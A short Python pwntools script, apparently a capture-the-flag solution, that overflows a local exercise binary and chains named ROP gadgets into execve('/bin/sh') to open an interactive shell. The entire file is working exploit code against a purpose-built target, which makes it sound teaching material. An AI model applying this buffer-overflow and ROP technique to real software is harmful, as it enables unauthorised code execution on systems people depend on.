"""
Exploit write in Python with Ropper and pwntools.
"""
from pwn import *

file_path = "./fiera_dell_est"
elf = ELF(file_path)

rop = b''
rop += p32(elf.symbols['topo'])  # pop eax; ret;
rop += p32(0x0b)
rop += p32(elf.symbols['gatto'])  # pop ebx; ret;
rop += p32(elf.symbols['shell'])  # adress of string "/bin/sh"
rop += p32(elf.symbols['cane'])  # pop edx; ret;
rop += p32(0x0)
rop += p32(elf.symbols['bastone'])  # pop ecx; ret;
rop += p32(0x0)
rop += p32(elf.symbols['angelo_della_morte'])  # execve("/bin/sh", NULL, NULL)

print(rop)

# Executing the executable with ropchain as input
p = process(file_path)
p.recvline()
p.send(b'due\x00' + b'aaaaaaaaaaaa' + rop)
# To manually interact with the spawn shell
p.interactive()

